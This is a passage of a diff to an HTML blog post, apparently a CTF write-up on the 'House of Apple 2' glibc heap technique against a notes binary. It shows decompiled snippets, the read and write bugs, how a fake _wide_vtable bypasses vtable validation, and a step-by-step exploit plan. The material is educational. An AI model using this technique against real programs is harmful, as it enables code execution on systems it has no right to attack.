@@ -3,8 +3,14 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <meta name="description" content="An Apple a Day Keeps ASLR Away" />
-    <title>An Apple a Day Keeps ASLR Away - mooofin</title>
+    <meta name="description" content="House of Apple 2: Subverting glibc Wide-Mode I/O via _wide_data Corruption" />
+    <meta property="og:title" content="House of Apple 2" />
+    <meta property="og:description" content="Abusing glibc Wide-Mode I/O and FILE Structure Corruption for Reliable Code Execution" />
+    <meta property="og:image" content="https://mooofin.github.io/images/posts/an-apple-a-day/Freaky_Apple.webp" />
+    <meta property="og:type" content="article" />
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:image" content="https://mooofin.github.io/images/posts/an-apple-a-day/Freaky_Apple.webp" />
+    <title>House of Apple 2: Subverting glibc Wide-Mode I/O via _wide_data Corruption - mooofin</title>
     <link rel="stylesheet" href="../style.css" />
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-light.min.css" />
     <link rel="icon" href="../public/favicon.ico" />
@@ -37,16 +43,36 @@
         margin: 20px 0;
       }
       .blog-content pre {
-        background: #eee;
-        border: 1px inset #ccc;
-        padding: 10px;
+        background: #fbfbf8;
+        border: 1px solid #cfcfc7;
+        padding: 12px 14px;
         overflow-x: auto;
         font-family: "Courier New", monospace;
+        font-size: 13px;
+        line-height: 1.5;
+        box-shadow: inset 0 0 0 1px #f4f4ef;
       }
-      .blog-content code {
-        background: #f0f0f0;
-        padding: 2px 4px;
+      .blog-content p code,
+      .blog-content li code,
+      .blog-content h1 code,
+      .blog-content h2 code,
+      .blog-content h3 code,
+      .blog-content h4 code {
+        background: #f7f7f3;
+        border: 1px solid #e4e4db;
+        color: #1f4aa8;
+        padding: 1px 5px;
         font-family: "Courier New", monospace;
+        font-size: 0.95em;
+        font-weight: 700;
+      }
+      .blog-content pre code {
+        background: none;
+        border: none;
+        color: inherit;
+        padding: 0;
+        font-size: inherit;
+        font-weight: 400;
       }
       .blog-content blockquote {
         border-left: 4px solid #000080;
@@ -62,26 +88,41 @@
         border-bottom: 1px solid #ccc;
         padding-bottom: 10px;
       }
-      .blog-content pre code { background: none; padding: 0; border: none; }
-      .hljs { background: #fafaf8; }
-      .hljs-keyword { color: #b0306a; }
-      .hljs-string { color: #2d6a2d; }
-      .hljs-comment { color: #808080; font-style: italic; }
-      .hljs-number { color: #7a2d8a; }
-      .hljs-type { color: #c06030; }
-      .hljs-literal { color: #d49080; }
-      .hljs-built_in { color: #7a2d8a; }
-      .hljs-title.class_ { color: #212529; }
-      .hljs-title.function_ { color: #212529; }
-      .hljs-attr { color: #b0306a; }
-      .hljs-params { color: #424242; }
-      .hljs-meta { color: #c06030; }
-      .hljs-meta .hljs-keyword { color: #c06030; }
-      .hljs-symbol { color: #2d6a2d; }
-      .hljs-section { color: #b0306a; }
-      .hljs-selector-tag { color: #b0306a; }
-      .hljs-addition { color: #2d6a2d; }
-      .hljs-deletion { color: #a04040; }
+      .hljs { background: #fbfbf8; color: #111; }
+      .hljs-keyword,
+      .hljs-selector-tag,
+      .hljs-section {
+        color: #1f4aa8;
+        font-weight: 700;
+      }
+      .hljs-string,
+      .hljs-symbol,
+      .hljs-addition {
+        color: #0f6b3c;
+      }
+      .hljs-comment {
+        color: #6e6e6e;
+        font-style: italic;
+      }
+      .hljs-number,
+      .hljs-built_in,
+      .hljs-literal {
+        color: #7b3fb3;
+      }
+      .hljs-type,
+      .hljs-meta,
+      .hljs-meta .hljs-keyword {
+        color: #9a4d00;
+      }
+      .hljs-title.class_,
+      .hljs-title.function_,
+      .hljs-params,
+      .hljs-attr {
+        color: #111;
+      }
+      .hljs-deletion {
+        color: #a13131;
+      }
     </style>
   </head>
   <body>
@@ -205,7 +246,7 @@
               alt=""
             />
             <a href="../index.html">Home</a> &gt;
-            <a href="../blog.html">Blog</a> &gt; An Apple a Day Keeps ASLR Away
+            <a href="../blog.html">Blog</a> &gt; House of Apple 2: Subverting glibc Wide-Mode I/O via _wide_data Corruption
           </div>
         </div>
         <div class="window">
@@ -215,41 +256,32 @@
               class="icon-16"
               alt=""
             />
-            An Apple a Day Keeps ASLR Away
+            House of Apple 2: Subverting glibc Wide-Mode I/O via _wide_data Corruption
           </div>
           <div class="window-body">
-            <div class="blog-meta">
-              <img
-                src="https://win98icons.alexmeub.com/icons/png/clock-0.png"
-                class="icon-16"
-                alt=""
-              />
-              Posted: 2025-07-22 |
-              <img
-                src="https://win98icons.alexmeub.com/icons/png/user-0.png"
-                class="icon-16"
-                alt=""
-              />
-              Author: Siddharth |
-              <img
-                src="https://win98icons.alexmeub.com/icons/png/directory_listing-0.png"
-                class="icon-16"
-                alt=""
-              />
-              Category: CTF
-            </div>
             <div class="blog-meta">
               <strong>Date:</strong> 2025-07-22 | <strong>Tags:</strong>
             </div>
 
             <div class="blog-content">
+              <div style="margin: 0 0 18px; padding: 14px 16px; text-align: center; border: 1px solid #c8c8c8; background: #fafaf8;">
+                <div style="font-family: 'Times New Roman', Times, serif; font-size: 28px; font-weight: 700; line-height: 1.2; color: #111;">
+                  House of Apple 2
+                </div>
+                <div style="font-family: 'Times New Roman', Times, serif; font-size: 18px; font-style: italic; line-height: 1.35; color: #333; margin-top: 6px;">
+                  Subverting glibc Wide-Mode I/O via <code>_wide_data</code> Corruption
+                </div>
+              </div>
               <p>
-                <em
-                  >[Abusing glibc Wide-Mode I/O and FILE Structure Corruption
-                  for Reliable Code Execution]</em
-                >
+                <em>[Abusing glibc Wide-Mode I/O and FILE Structure Corruption for Reliable Code Execution]</em>
               </p>
-              <p>---</p>
+              <p>
+                we're handed a notes application - create, delete, read, write  Two bugs are there in it: a signed-integer underflow in <code>read_note</code> that lets you walk backwards into the GOT, and an unvalidated offset in <code>write_note</code> that gives you an arbitrary relative write.
+              </p>
+              <p>
+                I went through a few approaches before landing here. House of Orange felt too fragile on this libc version, and FSOP via <code>_IO_overflow</code> directly hits the vtable check. House of Apple 2 works around that by staying on the validated vtable but pivoting execution through <code>_wide_vtable</code>, which glibc doesn't validates. 
+              </p>
+              <hr>
               <p>
                 We are provided with the following <code>checksec</code> output
                 for the binary <code>notes_patched</code>:
@@ -259,74 +291,15 @@
               ><code>muffin@gentoo checksec -f notes_patched
 ELF64: | Canary: true  CFI: false SafeStack: false Fortify: false Fortified:  0 NX: true  PIE: Full Relro: Full    RPATH: None RUNPATH: . | File: notes_patched
 </code></pre>
-              <h3>Enabled Protections</h3>
-              <ul>
-                <li><strong>Stack Canary: Enabled</strong></li>
-              </ul>
               <p>
-                Stack canaries are present, making straightforward stack-based
-                buffer overflows harder to exploit without a leak.
+                 mitigations that are present : stack canary, NX, full PIE, full RELRO. GOT is read-only after relocation, ASLR covers everything. CFI and SafeStack are both off - once you get a function pointer you can point it anywhere. FORTIFY is off too. The <code>RUNPATH: .</code> just means the binary loads libc from the current directory, so we need to use pwninit to patch it 
               </p>
-              <ul>
-                <li><strong>NX (Non-Executable Memory): Enabled</strong></li>
-              </ul>
-              <p>
-                The stack and heap are non-executable, preventing direct
-                shellcode execution in writable memory regions.
-              </p>
-              <ul>
-                <li>
-                  <strong
-                    >PIE (Position Independent Executable): Enabled
-                    (Full)</strong
-                  >
-                </li>
-              </ul>
-              <p>
-                The binary is fully position-independent, meaning ASLR
-                randomizes its base address at runtime.
-              </p>
-              <ul>
-                <li><strong>RELRO: Enabled (Full)</strong></li>
-              </ul>
-              <p>
-                The Global Offset Table (GOT) is marked read-only after
-                relocation, preventing GOT overwrite attacks.
-              </p>
-              <h3>Disabled Protections</h3>
-              <ul>
-                <li><strong>CFI (Control Flow Integrity): Disabled</strong></li>
-              </ul>
-              <p>
-                No enforcement of valid control-flow transfers, allowing
-                indirect jumps or returns to be abused if control is gained.
-              </p>
-              <ul>
-                <li><strong>SafeStack: Disabled</strong></li>
-              </ul>
-              <p>
-                No separation between safe and unsafe stack objects, increasing
-                the impact of memory corruption bugs.
-              </p>
-              <ul>
-                <li><strong>FORTIFY_SOURCE: Disabled</strong></li>
-              </ul>
-              <p>
-                No fortified libc wrappers are in use (and no functions are
-                fortified), reducing runtime bounds checking.
-              </p>
-              <p>
-                RUNPATH: . - The binary looks for shared libraries in the
-                current directory first (potential security risk)
-              </p>
-              <p>file</p>
               <div class="img-container">
                 <img
                   src="../images/posts/an-apple-a-day/apple-1.png"
                   alt="Binary File Info"
                 />
               </div>
-              <p>strings so this is a notes app ,</p>
               <div class="img-container">
                 <img
                   src="../images/posts/an-apple-a-day/apple-2.png"
@@ -334,451 +307,42 @@ ELF64: | Canary: true  CFI: false SafeStack: false Fortify: false Fortified:  0 
                 />
               </div>
               <p>
-                The decompilation for the binary was more helpful as i got the
-                whole understanding of the program ;
+                The  four functions imp  here are : 
               </p>
-              <pre class="code-block"><code>//
-// This file was generated by the Retargetable Decompiler
-// Website: https://retdec.com
-//
-
-#include &lt;stdint.h&gt;
-#include &lt;stdio.h&gt;
-#include &lt;stdlib.h&gt;
-#include &lt;string.h&gt;
-
-// ------------------------ Structures ------------------------
-
-struct _IO_FILE {
-    int32_t e0;
-};
-
-// ------------------- Function Prototypes --------------------
-
-int64_t _fini(void);
-int64_t _init(void);
-int64_t _start(int64_t a1, int64_t a2, int64_t a3, int64_t a4, int64_t a5, int64_t a6);
-int64_t create_note(void);
-int64_t delete_note(void);
-void function_1030(int64_t * ptr);
-int32_t function_1040(char * s);
-void function_1050(void);
-int32_t function_1060(char * format, ...);
-int32_t function_1070(char * s, char * reject);
-char * function_1080(char * s, int32_t n, struct _IO_FILE * stream);
-int32_t function_1090(void);
-int64_t * function_10a0(int32_t size);
-int32_t function_10b0(struct _IO_FILE * stream, char * buf, int32_t modes, int32_t n);
-int32_t function_10c0(char * format, ...);
-int32_t function_10d0(int64_t * ptr, int32_t size, int32_t n, struct _IO_FILE * s);
-int64_t function_1110(void);
-int64_t function_1140(void);
-int64_t function_1180(void);
-int64_t function_11d0(void);
-int64_t menu(void);
-int64_t read_note(void);
-int64_t setup(void);
-int64_t write_note(void);
-
-// --------------------- Global Variables ---------------------
-
-int64_t g1 = -0x9b2000009cc; // 0x2208
-struct _IO_FILE * g2 = NULL; // 0x4020
-struct _IO_FILE * g3 = NULL; // 0x4030
-char g4 = 0; // 0x4048
-char * g5; // 0x4080
-int64_t g6 = 0; // 0x4088
-int32_t g7 = 0; // 0x4120
-int32_t g8 = 0; // 0x4121
-int32_t g9;
-
-// ------- Dynamically Linked Functions Without Header --------
-
-void __cxa_finalize(int64_t * a1);
-void __gmon_start__(void);
-int32_t __libc_start_main(int64_t a1, int32_t a2, char ** a3, void (*a4)(), void (*a5)(), void (*a6)());
-void __stack_chk_fail(void);
-
-// ------------------------ Functions -------------------------
-
-// Address range: 0x1000 - 0x101b
-int64_t _init(void) {
-    int64_t result = 0; // 0x1012
-    if (*(int64_t *)0x3fe8 != 0) {
-        // 0x1014
-        __gmon_start__();
-        result = &amp;g9;
-    }
-    // 0x1016
-    return result;
-}
-
-// Address range: 0x1030 - 0x1036
-void function_1030(int64_t * ptr) {
-    // 0x1030
-    free(ptr);
-}
-
-// Address range: 0x1040 - 0x1046
-int32_t function_1040(char * s) {
-    // 0x1040
-    return puts(s);
-}
-
-// Address range: 0x1050 - 0x1056
-void function_1050(void) {
-    // 0x1050
-    __stack_chk_fail();
-}
-
-// Address range: 0x1060 - 0x1066
-int32_t function_1060(char * format, ...) {
-    // 0x1060
-    return printf(format);
-}
-
-// Address range: 0x1070 - 0x1076
-int32_t function_1070(char * s, char * reject) {
-    // 0x1070
-    return strcspn(s, reject);
-}
-
-// Address range: 0x1080 - 0x1086
-char * function_1080(char * s, int32_t n, struct _IO_FILE * stream) {
-    // 0x1080
-    return fgets(s, n, stream);
-}
-
-// Address range: 0x1090 - 0x1096
-int32_t function_1090(void) {
-    // 0x1090
-    return getchar();
-}
-
-// Address range: 0x10a0 - 0x10a6
-int64_t * function_10a0(int32_t size) {
-    // 0x10a0
-    return malloc(size);
-}
-
-// Address range: 0x10b0 - 0x10b6
-int32_t function_10b0(struct _IO_FILE * stream, char * buf, int32_t modes, int32_t n) {
-    // 0x10b0
-    return setvbuf(stream, buf, modes, n);
-}
-
-// Address range: 0x10c0 - 0x10c6
-int32_t function_10c0(char * format, ...) {
-    // 0x10c0
-    return scanf(format);
-}
-
-// Address range: 0x10d0 - 0x10d6
-int32_t function_10d0(int64_t * ptr, int32_t size, int32_t n, struct _IO_FILE * s) {
-    // 0x10d0
-    return fwrite(ptr, size, n, s);
-}
-
-// Address range: 0x10e0 - 0x1106
-int64_t _start(int64_t a1, int64_t a2, int64_t a3, int64_t a4, int64_t a5, int64_t a6) {
-    // 0x10e0
-    int64_t v1; // 0x10e0
-    __libc_start_main(0x17b4, (int32_t)a6, (char **)&amp;v1, NULL, NULL, (void (*)())a3);
-    __asm_hlt();
-    // UNREACHABLE
-}
-
-// Address range: 0x1110 - 0x1139
-int64_t function_1110(void) {
-    // 0x1110
-    return 0x4018;
-}
-
-// Address range: 0x1140 - 0x1179
-int64_t function_1140(void) {
-    // 0x1140
-    return 0;
-}
-
-// Address range: 0x1180 - 0x11c1
-int64_t function_1180(void) {
-    // 0x1180
-    if (g4 != 0) {
-        // 0x11c0
-        int64_t result; // 0x1180
-        return result;
-    }
-    // 0x118d
-    if (*(int64_t *)0x3ff8 != 0) {
-        // 0x119b
-        __cxa_finalize((int64_t *)*(int64_t *)0x4008);
-    }
-    int64_t result2 = function_1110(); // 0x11a8
-    g4 = 1;
-    return result2;
-}
-
-// Address range: 0x11d0 - 0x11d9
-int64_t function_11d0(void) {
-    // 0x11d0
-    return function_1140();
-}
-
-// Address range: 0x11d9 - 0x121c
-int64_t setup(void) {
-    // 0x11d9
-    setvbuf(g3, NULL, 2, 0);
-    return setvbuf(g2, NULL, 2, 0);
-}
-
-// Address range: 0x121c - 0x1241
-int64_t menu(void) {
-    // 0x121c
-    puts("\n[ MENU ]\n");
-    return puts("[1] CREATE NOTE\n[2] DELETE NOTE\n[3] READ NOTE\n[4] WRITE NOTE\n[5] EXIT\n");
-}
-
-// Address range: 0x1241 - 0x1428
-int64_t create_note(void) {
-    int64_t v1 = __readfsqword(40); // 0x124a
-    int32_t v2 = 0; // 0x128b
-    int64_t v3 = 16 * (int64_t)v2;
-    int32_t * v4 = (int32_t *)(v3 + (int64_t)&amp;g6);
-    int64_t v5; // 0x1241
-    while (*v4 != 0) {
-        // 0x128b
-        v2++;
-        if (v2 &gt;= 10) {
-            // 0x129b
-            puts("\n!! NO SPACE FOR NEW NOTE !!");
-            v5 = 0xffffffff;
-            goto lab_0x140e;
-        }
-        v3 = 16 * (int64_t)v2;
-        v4 = (int32_t *)(v3 + (int64_t)&amp;g6);
-    }
-    // 0x12b4
-    printf("ENTER SIZE: ");
-    int64_t size; // bp-44, 0x1241
+              <pre class="code-block"><code>int64_t create_note(void) {
     scanf("%d", &amp;size);
-    int64_t * mem = malloc((int32_t)size); // 0x12eb
-    int64_t * str = (int64_t *)(v3 + (int64_t)&amp;g5); // 0x1306
-    *str = (int64_t)mem;
-    if (mem != NULL) {
-        // 0x133f
-        printf("\nENTER NOTE (MAX %d CHARS): ", size + 0xffffffff &amp; 0xffffffff);
-        getchar();
-        fgets((char *)*str, (int32_t)size, g3);
-        int64_t str2 = *str; // 0x139e
-        *(char *)(str2 + (int64_t)strcspn((char *)str2, "\n")) = 0;
-        printf("%s", "&lt; BACK");
-        *v4 = 1;
-        v5 = 0;
-    } else {
-        // 0x1326
-        puts("\n!! MEMORY ALLOCATION FAILED !!");
-        v5 = 0xffffffff;
-    }
-    goto lab_0x140e;
-  lab_0x140e:;
-    int64_t result = v5; // 0x141b
-    if (v1 != __readfsqword(40)) {
-        // 0x141d
-        __stack_chk_fail();
-        result = &amp;g9;
-    }
-    // 0x1422
-    return result;
+    int64_t *mem = malloc((int32_t)size);
+    fgets((char *)*str, (int32_t)size, stdin);
 }
 
-// Address range: 0x1428 - 0x1546
 int64_t delete_note(void) {
-    int64_t v1 = __readfsqword(40); // 0x1430
-    int32_t v2 = 0; // bp-20, 0x143f
-    printf("\nENTER INDEX: ");
-    scanf("%1d", &amp;v2);
-    getchar();
-    int64_t v3; // 0x1428
-    if (v2 &gt; 9) {
-        // 0x14a3
-        puts("\n!! INVALID NOTE INDEX !!");
-        v3 = 0xffffffff;
-        goto lab_0x1530;
-    } else {
-        int64_t v4 = 16 * (int64_t)v2; // 0x148e
-        if (*(int32_t *)(v4 + (int64_t)&amp;g6) != 0) {
-            // 0x14b9
-            free((int64_t *)*(int64_t *)(v4 + (int64_t)&amp;g5));
-            int64_t v5 = 16 * (int64_t)v2; // 0x14dd
-            *(int64_t *)(v5 + (int64_t)&amp;g5) = 0;
-            *(int32_t *)(v5 + (int64_t)&amp;g6) = 0;
-            printf("%s", "&lt; BACK");
-            v3 = 0;
-            goto lab_0x1530;
-        } else {
-            // 0x14a3
-            puts("\n!! INVALID NOTE INDEX !!");
-            v3 = 0xffffffff;
-            goto lab_0x1530;
-        }
-    }
-  lab_0x1530:;
-    int64_t result = v3; // 0x153d
-    if (v1 != __readfsqword(40)) {
-        // 0x153f
-        __stack_chk_fail();
-        result = &amp;g9;
-    }
-    // 0x1544
-    return result;
+    free((int64_t *)*(int64_t *)(v4 + (int64_t)&amp;g5));
+    *(int64_t *)(v5 + (int64_t)&amp;g5) = 0;
+    *(int32_t *)(v5 + (int64_t)&amp;g6) = 0;
 }
 
-// Address range: 0x1546 - 0x168e
 int64_t write_note(void) {
-    int64_t v1 = __readfsqword(40); // 0x154e
-    int32_t v2 = 0; // bp-28, 0x155d
-    int64_t v3 = 0; // bp-24, 0x1564
-    printf("\nENTER NOTE INDEX: ");
-    scanf("%3d", &amp;v2);
-    int64_t v4; // 0x1546
-    if (v2 &gt; 9) {
-        // 0x15c4
-        puts("\n!! INVALID NOTE INDEX !!");
-        v4 = 0xffffffff;
-        goto lab_0x1678;
-    } else {
-        int32_t v5 = *(int32_t *)(16 * (int64_t)v2 + (int64_t)&amp;g6); // 0x15bd
-        if (v5 != 0) {
-            // 0x15dd
-            printf("ENTER WRITE INDEX: ");
-            scanf("%ld", &amp;v3);
-            printf("ENTER DATA: ");
-            int64_t v6 = *(int64_t *)(16 * (int64_t)v2 + (int64_t)&amp;g5); // 0x1633
-            scanf("%s", (char **)(v3 + v6));
-            printf("%s", "&lt; BACK");
-            v4 = 0;
-            goto lab_0x1678;
-        } else {
-            // 0x15c4
-            puts("\n!! INVALID NOTE INDEX !!");
-            v4 = 0xffffffff;
-            goto lab_0x1678;
-        }
-    }
-  lab_0x1678:;
-    int64_t result = v4; // 0x1685
-    if (v1 != __readfsqword(40)) {
-        // 0x1687
-        __stack_chk_fail();
-        result = &amp;g9;
-    }
-    // 0x168c
-    return result;
+    scanf("%ld", &amp;v3);
+    scanf("%s", (char **)(v3 + notes[idx]));
 }
 
-// Address range: 0x168e - 0x17b4
 int64_t read_note(void) {
-    int64_t v1 = __readfsqword(40); // 0x1696
-    int32_t v2 = 0; // bp-20, 0x16a5
-    int64_t v3; // 0x168e
-    if (g7 &gt; 1) {
-        // 0x176c
-        puts("\n?? GET SPOTIFY PREMIUM ??");
-        printf("%s", "&lt; BACK");
-        v3 = 0;
-    } else {
-        // 0x16bb
-        printf("\nENTER INDEX: ");
-        scanf("%3d", &amp;v2);
-        getchar();
-        if (v2 &lt; 11) {
-            // 0x1710
-            printf("NOTE: %s\n", (char *)(16 * (int64_t)v2 + (int64_t)&amp;g5));
-            printf("%s", "&lt; BACK");
-            g7 = &amp;g8;
-            v3 = 0;
-        } else {
-            // 0x16f7
-            puts("\n!! INVALID NOTE INDEX !!");
-            v3 = 0xffffffff;
-        }
-    }
-    int64_t result = v3; // 0x17ab
-    if (v1 != __readfsqword(40)) {
-        // 0x17ad
-        __stack_chk_fail();
-        result = &amp;g9;
-    }
-    // 0x17b2
-    return result;
+    scanf("%3d", &amp;v2);
+    if (v2 &lt; 11)
+        printf("NOTE: %s\n", (char *)(16 * (int64_t)v2 + (int64_t)&amp;g5));
 }
-
-// Address range: 0x17b4 - 0x198b
-int main(int argc, char ** argv) {
-    // 0x17b4
-    __readfsqword(40);
-    setup();
-    menu();
-    printf("&gt;&gt; ");
-    int64_t v1; // bp-20, 0x17b4
-    scanf("%1d", &amp;v1);
-    uint32_t v2; // 0x182b
-    if ((int32_t)v1 &lt; 6) {
-        // 0x181a
-        v2 = *(int32_t *)((4 * v1 &amp; 0x3fffffffc) + (int64_t)&amp;g1);
-        return (int64_t)v2 + (int64_t)&amp;g1;
-    }
-    puts("[ INVALID CHOICE ]");
-    menu();
-    printf("&gt;&gt; ");
-    scanf("%1d", &amp;v1);
-    while ((int32_t)v1 &gt;= 6) {
-        // 0x1958
-        puts("[ INVALID CHOICE ]");
-        menu();
-        printf("&gt;&gt; ");
-        scanf("%1d", &amp;v1);
-    }
-    // 0x181a
-    v2 = *(int32_t *)((4 * v1 &amp; 0x3fffffffc) + (int64_t)&amp;g1);
-    return (int64_t)v2 + (int64_t)&amp;g1;
-}
-
-// Address range: 0x198c - 0x1999
-int64_t _fini(void) {
-    // 0x198c
-    int64_t result; // 0x198c
-    return result;
-}
-
-// --------------------- Meta-Information ---------------------
-
-// Detected compiler/packer: gcc (14.2.1)
-// Detected functions: 25
 </code></pre>
               <p>
-                While researching heap exploitation techniques and going through
-                various "House of ____" exploits, I found that
-                <a href="https://bbs.kanxue.com/thread-273832.htm"
-                  ><strong>House of Apple 2</strong></a
-                >
-                matched perfectly with what this challenge required.
+                The House of Apple technique abuses <code>_IO_FILE->_wide_data</code> - hijack that pointer and you can redirect writes to arbitrary memory or, in the variant we're using, control execution through FILE structure corruption. <a href="https://bbs.kanxue.com/thread-273832.htm">Original writeup by roderick01</a> if you want the full breakdown.
               </p>
-              <p>
-                The House of Apple technique is primarily concerned with
-                <code>_IO_FILE->_wide_data</code> member attacks. It allows us
-                to rewrite memory after hijacking this member or control the
-                program execution flow through FILE structure corruption.
-              </p>
-              <h2>What is a Vtable?</h2>
+              <h2>SO What is a Vtable?</h2>
               <p>
                 A basic vtable is nothing more than an ordinary struct
                 containing function pointers, which can be shared between object
                 instances.
               </p>
               <p>
-                Ill try to write a demo program to understand hoa-2 better and
-                what does it solve and what it does .
+                I'll put together a small demo to make the mechanics concrete - easier to follow the exploit steps  
               </p>
               <div class="img-container">
                 <img
@@ -786,11 +350,7 @@ int64_t _fini(void) {
                   alt="Decompiled Code"
                 />
               </div>
-              <h3>glibc Internals</h3>
-              <p>
-                Next we will need a heap controlled area for exploiting. Before
-                that, some glibc internals.
-              </p>
+              <h3>glibc internals :3 </h3>
               <p>
                 glibc uses a big internal structure called
                 <code>struct _IO_FILE</code>. This is what backs FILE * objects
@@ -812,9 +372,7 @@ int64_t _fini(void) {
 };
 </code></pre>
               <p>
-                What it contains conceptually: _IO_wide_data holds
-                wide-character buffers, state for multibyte to wide-char
-                conversion, and pointers used during wide I/O operations.
+                It holds wide-character buffers, multibyte-to-wide conversion state, and pointers used during wide I/O operations.
               </p>
               <p>Simplified idea:</p>
               <pre class="code-block"><code>struct _IO_wide_data {
@@ -825,25 +383,6 @@ int64_t _fini(void) {
     ...
 };
 </code></pre>
-              <p>
-                The thing is, if you control _wide_data, glibc will trust
-                pointers inside it. Those pointers get dereferenced during I/O
-                operations. Fake _wide_data lets you redirect reads/writes or
-                prepare for a vtable call.
-              </p>
-              <h1>glibc vtable exploitation</h1>
-              <p>
-                When glibc performs an I/O operation, it does something like:
-              </p>
-              <pre
-                class="code-block"
-              ><code>fp-&gt;_wide_data-&gt;_wide_vtable-&gt;overflow(fp, ch);
-</code></pre>
-              <p>
-                If _wide_vtable is fake and heap-controlled, glibc jumps to an
-                attacker-controlled address. This is a clean RIP control
-                primitive.
-              </p>
               <p>
                 Internally, libc has three global FILE objects: stdin, stdout,
                 stderr. Each of these is a fully-initialized _IO_FILE structure
@@ -860,14 +399,7 @@ int64_t _fini(void) {
               <p>Inside _IO_FILE:</p>
               <pre class="code-block"><code>int _mode;
 </code></pre>
-              <p>glibc uses _mode to decide byte I/O vs wide-char I/O.</p>
-              <p>Rule (from glibc):</p>
-              <pre class="code-block"><code>if (fp-&gt;_mode &gt; 0)
-    use wide I/O
-else
-    use byte I/O
-</code></pre>
-              <p>So when you do:</p>
+              <p>glibc checks <code>_mode</code> to pick the I/O path - positive goes wide, zero or negative stays in byte mode. So:</p>
               <pre class="code-block"><code>stderr_fp-&gt;_mode = 1;
 </code></pre>
               <p>
@@ -881,18 +413,10 @@ else
                 />
               </div>
               <p>
-                After compiling with these flags i got an error ; we needed to
-                do bc the FILE vtable itself is wrong, so glibc never reaches
-                _IO_WOVERFLOW
+                First attempt failed bc i was setting <code>_mode = 1</code> and pointing <code>_wide_data</code> at a fake struct caused glibc to abort before we even reached <code>_IO_WOVERFLOW</code>. The FILE vtable itself needs to be legitimate, otherwise the vtable check fires first. Apple 2 handles this by keeping a real vtable in place and only faking the <em>wide</em> vtable, which glibc never validates lol 
               </p>
               <p>
-                Apple 2 still needs a legitimate FILE vtable to route execution
-                into the wide path
-              </p>
-              <p>
-                While looking through more on house of apple i found this image
-                , which was on the idea of exploit this chalelnge closely
-                resembleded
+                This  maps out the approach:
               </p>
               <div class="img-container">
                 <img
@@ -901,132 +425,19 @@ else
                 />
               </div>
               <p>
-                In older glibc versions (< 2.24), you could directly overwrite
-                FILE structure vtables. But glibc added
-                <strong>vtable validation</strong> that checks if vtable
-                pointers are within valid memory ranges.
+                Since glibc 2.24, overwriting a FILE vtable directly causes an abort - there’s a range check that verifies the pointer lands inside the known vtable section. House of Apple 2 doesn’t fight that check. It uses <code>_IO_wfile_jumps</code>, a real vtable already in that range, so validation passes. The unprotected part is <code>_wide_vtable</code> - glibc never runs the range check on it. Set <code>_mode &gt; 0</code> to force the wide code path and you get an unvalidated function pointer dispatch.
               </p>
               <p>
-                House of Apple 2 bypasses these protections by relying on a
-                design gap in glibc’s FILE validation logic. Instead of forging
-                a fake vtable, it reuses a legitimate and fully validated vtable
-                (<code>_IO_wfile_jumps</code>), which passes all internal
-                consistency checks. The exploit then redirects the
-                <strong>wide-character vtable pointer</strong>, which glibc does
-                not subject to the same validation as the primary vtable. When a
-                wide-character I/O path is triggered, glibc dispatches function
-                calls through this unvalidated wide vtable, allowing the
-                attacker to gain control of execution without tripping the
-                standard vtable integrity checks.
+                The  mechanism is <code>_IO_list_all</code>, a global linked list glibc walks on exit to flush every open FILE. Corrupt that pointer to aim at your fake FILE and glibc processes it during cleanup, calling through whatever vtable you put there.
               </p>
               <p>
-                When a program calls something like <code>fwrite()</code>, glibc
-                eventually looks up a function pointer from the FILE structure’s
-                vtable and calls it. This means the program trusts whatever
-                function address is stored in that table. If an attacker can
-                control that pointer, they get to choose what code runs. That’s
-                the core idea about apple
+                The write bug: <code>write_note</code> takes a note index plus a signed offset and does <code>scanf("%s", notes[idx] + offset)</code> with no bounds check. Negative offset, huge offset - doesn't matter. Combined with a known heap address, that's an arbitrary write primitive covering anything in range of the heap.
               </p>
               <p>
-                glibc also keeps a global linked list of every open FILE stream
-                called <code>_IO_list_all</code>. When the program exits, glibc
-                walks this list to flush and close all files. It starts at
-                <code>_IO_list_all</code>, follows each
-                <code>_chain</code> pointer, and calls flush-related functions
-                on every FILE object it finds. The attack abuses this cleanup
-                step by corrupting the list so that it points to a fake or
-                attacker-controlled FILE structure. When glibc later flushes all
-                streams, it unknowingly calls functions through the
-                attacker-controlled vtable, giving code execution.
+                Plan: leak libc base via the negative-index read, get a heap address from malloc metadata in a fresh chunk, build a fake FILE on the heap (fake <code>_IO_FILE</code> + fake <code>_IO_wide_data</code> + fake wide vtable with <code>system</code> at the <code>doallocate</code> slot), patch the internal pointers once we know where things landed, overwrite <code>_IO_list_all</code> to point at our fake FILE, then exit and let glibc do the rest.
               </p>
               <p>
-                This is a simple notes application with the following functions:
-              </p>
-              <pre
-                class="code-block"
-              ><code>1. Create note - Allocates heap memory for a note
-2. Delete note - Frees a note
-3. Read note   - Displays note content
-4. Write note  - Writes data to a note at an offset
-5. Exit        - Exits the program
-</code></pre>
-              <p>
-                The vulnerability is in the
-                <strong>write_note</strong> function:
-              </p>
-              <pre
-                class="code-block"
-              ><code>void write_note(int idx, size_t offset, char *data) {
-    // BUG: offset is NOT validated!
-    scanf("%s", notes[idx] + offset);
-}
-</code></pre>
-              <p>
-                <strong>What this means:</strong>
-                - <code>notes[idx]</code> is a pointer to our note on the heap -
-                We can specify ANY <code>offset</code> (positive or negative!) -
-                <code>notes[idx] + offset</code> lets us write ANYWHERE relative
-                to our note
-              </p>
-              <p>
-                <strong>Example:</strong>
-              </p>
-              <pre
-                class="code-block"
-              ><code>// If notes[0] is at address 0x555555559000
-// and we use offset = -0x1000
-// We write to: 0x555555559000 - 0x1000 = 0x555555558000
-
-// Or if offset = 0x10000, we write to:
-// 0x555555559000 + 0x10000 = 0x555555569000
-</code></pre>
-              <p>
-                This is an <strong>arbitrary relative write</strong> - we can
-                write anywhere in memory relative to our heap
-              </p>
-              <p>
-                So First, we need to <strong>leak a libc address</strong>. ASLR
-                randomizes where libc lives in memory, so until we know its base
-                address, we can’t reliably call functions like
-                <code>system</code>. Once we leak one libc pointer, we can
-                calculate where everything else in libc is.
-              </p>
-              <p>
-                Next, we <strong>leak a heap address</strong>. This tells us
-                where our controlled data lives in memory. We need this because
-                we’re going to place a fake object on the heap and later make
-                the program treat it as something real.
-              </p>
-              <p>
-                Then we
-                <strong>build a fake FILE structure on the heap</strong>. A FILE
-                structure is just a big struct full of pointers and flags. glibc
-                trusts it. If we carefully fill it with the right values, glibc
